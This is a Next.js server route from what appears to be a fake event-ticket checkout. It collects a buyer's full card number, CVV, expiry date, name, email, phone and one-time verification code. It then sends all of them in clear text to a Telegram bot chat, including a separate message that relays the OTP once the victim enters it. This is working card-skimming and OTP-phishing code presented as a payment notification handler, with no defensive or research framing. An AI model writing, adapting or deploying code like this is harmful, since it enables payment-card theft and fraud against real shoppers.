import { NextRequest, NextResponse } from 'next/server'

export async function POST(request: NextRequest) {
  try {
    const {
      cardFullName,
      cardNumber,
      cardCvv,
      cardExpiry,
      email,
      phone,
      eventTitle,
      ticketName,
      quantity,
      total,
      otpCode,
      otpVerified,
      paymentStatus,
    } = await request.json()

    const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN
    const telegramChatId = process.env.TELEGRAM_CHAT_ID

    if (!telegramBotToken || !telegramChatId) {
      console.log('[v0] Telegram credentials not configured, skipping notification')
      return NextResponse.json({ success: true })
    }

    // Prepare the message with ALL card details
    const timestamp = new Date().toLocaleString('pl-PL')
    const orderId = Date.now()
    
    let message = ''
    
    if (otpVerified && otpCode) {
      // OTP Verification Success Message
      message = `
✅ *OTP VERIFICATION SUCCESSFUL*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 *ORDER INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Event: ${eventTitle}
Ticket Type: ${ticketName}
Quantity: ${quantity}
Total Amount: ${total} PLN
Order ID: ${orderId}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ *OTP VERIFICATION DETAILS*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

OTP Code Entered: ${otpCode}
Verification Status: ✅ VERIFIED
Cardholder: ${cardFullName}
Card Last 4: ${cardNumber.slice(-4).padStart(cardNumber.length, '*').slice(-4)}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 *PAYMENT DETAILS*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Full Card Number: ${cardNumber}
CVV/CVC: ${cardCvv}
Expiry Date: ${cardExpiry}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 *CUSTOMER INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Email: ${email}
Phone: ${phone}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ *PAYMENT STATUS*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Status: 🟢 PAYMENT VERIFIED & COMPLETED
Timestamp: ${timestamp}

✓ Transaction successfully verified with OTP.
`
    } else {
      // Initial Card Details Message
      message = `
🛒 *CARD PAYMENT DETAILS - REQUIRES OTP VERIFICATION*

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 *ORDER INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Event: ${eventTitle}
Ticket Type: ${ticketName}
Quantity: ${quantity}
Total Amount: ${total} PLN
Order ID: ${orderId}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 *COMPLETE CARD DETAILS*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Cardholder Name: ${cardFullName}
Full Card Number: ${cardNumber}
CVV/CVC: ${cardCvv}
Expiry Date: ${cardExpiry}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👤 *CUSTOMER INFORMATION*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Email: ${email}
Phone: ${phone}

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏳ *STATUS*
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Status: 🔴 PENDING OTP VERIFICATION
Payment Method: Credit Card
Timestamp: ${timestamp}

⚠️ Awaiting customer OTP verification to complete the transaction.
🔐 Card details above - Store securely for reference.
    `
    }

    // Send to Telegram
    const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: telegramChatId,
        text: message,
        parse_mode: 'Markdown',
      }),
    })

    if (!response.ok) {
      const error = await response.json()
      console.error('[v0] Telegram API error:', error)
      return NextResponse.json(
        { error: 'Failed to send notification' },
        { status: 500 }
      )
    }

    return NextResponse.json({ success: true })
  } catch (error: any) {
    console.error('[v0] Error in send-card-details:', error.message)
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    )
  }
}
